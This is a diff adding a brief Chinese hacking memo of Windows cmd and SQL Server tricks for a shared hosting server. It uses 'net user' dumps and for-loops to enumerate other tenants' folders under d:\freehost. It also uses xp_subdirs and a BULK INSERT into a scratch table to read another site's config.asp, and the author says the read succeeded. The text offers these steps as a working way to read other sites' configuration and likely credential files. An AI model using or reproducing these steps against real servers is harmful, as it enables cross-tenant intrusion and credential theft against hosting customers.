@@ -1,0 +1,43 @@
+Cmd 下目录的操作技巧：
+
+
+
+cmd /c net user >有权限的目录.txt
+
+列出d的所有目录：
+for /d %i in (d:\freehost\*) do @echo %i
+
+把当前路径下文件夹的名字只有1-3个字母的显示出来：
+for /d %i in (???) do @echo %i
+
+以当前目录为搜索路径，把当前目录与下面的子目录的全部EXE文件列出：
+for /r %i in (*.exe) do @echo %i
+
+以指定目录为搜索路径，把当前目录与下面的子目录的所有文件列出：
+for /r "f:\freehost\hmadesign\web\" %i in (*.*) do @echo %i
+
+这个会显示a.txt里面的内容，因为/f的作用，会读出a.txt中：
+for /f %i in (c:\1.txt) do echo %i
+ 
+delims=后的空格是分隔符，tokens是取第几个位置：
+for /f "tokens=2 delims= " %i in (a.txt) do echo %i
+
+
+
+可以用xp_subdirs列出d:\freehost的所有子目录
+exec master..xp_subdirs ‘d:\freehost\xxxx336\web’
+
+用查询分析器执行如下语句
+Use xxx120;--(这里是随便选的一个数据库)
+drop table cmd; 
+create table cmd (a text);
+BULK INSERT cmd    
+FROM 'd:\freehost\xxx336\web\inc\config.asp'    
+WITH (    
+    FIELDTERMINATOR = '\n',  
+    ROWTERMINATOR = '\n\n'  
+     
+)   
+
+select * from cmd
+这样就成功读出了d:\freehost\xxx336\web\inc\config.asp文件的内容,很惊讶。
